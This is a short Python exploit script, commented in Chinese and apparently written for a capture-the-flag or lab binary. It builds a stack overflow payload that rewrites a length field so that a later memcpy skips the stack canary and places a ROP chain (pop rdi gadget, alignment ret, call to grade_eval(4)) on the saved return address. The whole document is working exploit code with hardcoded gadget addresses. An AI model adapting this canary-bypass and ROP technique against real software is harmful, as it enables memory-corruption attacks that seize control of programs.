#!/usr/bin/env python3
import struct
import sys

POP_RDI_RET = 0x4018A3  # __libc_csu_init 尾部未对齐的 pop rdi; ret
RET = 0x4018A4          # 单条 ret, 用来补齐栈对齐
GRADE_EVAL = 0x401677
LEN_TO_RIP = 0xA8       # logMsg(rbp-0xa0) 到 saved rip(rbp+8) 的偏移


# gets 只写 0x118 字节, 停在 canary 前, 末尾 NUL 落在它的低字节(本来就是 0);
# 同时把 f.len 改成 0xa8, 让随后的 memcpy 把 ROP 链写到 canary 上方的 saved rip.
chain  = struct.pack("<Q", POP_RDI_RET)
chain += struct.pack("<Q", 4)             # rdi = 4
chain += struct.pack("<Q", RET)           # 对齐
chain += struct.pack("<Q", GRADE_EVAL)    # grade_eval(4)

payload  = chain.ljust(0x100, b"F")       # expression[128] + logMsg[128]
payload += struct.pack("<I", LEN_TO_RIP)  # f.len = 0xa8, 把 memcpy 目标推到 rbp+8
payload += b"F" * 20                      # 填到 rbp-0x9, 不碰 canary
payload += b"\n"                          # gets() 在此停止, NUL 落在 canary 低字节

assert len(payload) == 0x118 + 1
sys.stdout.buffer.write(payload)
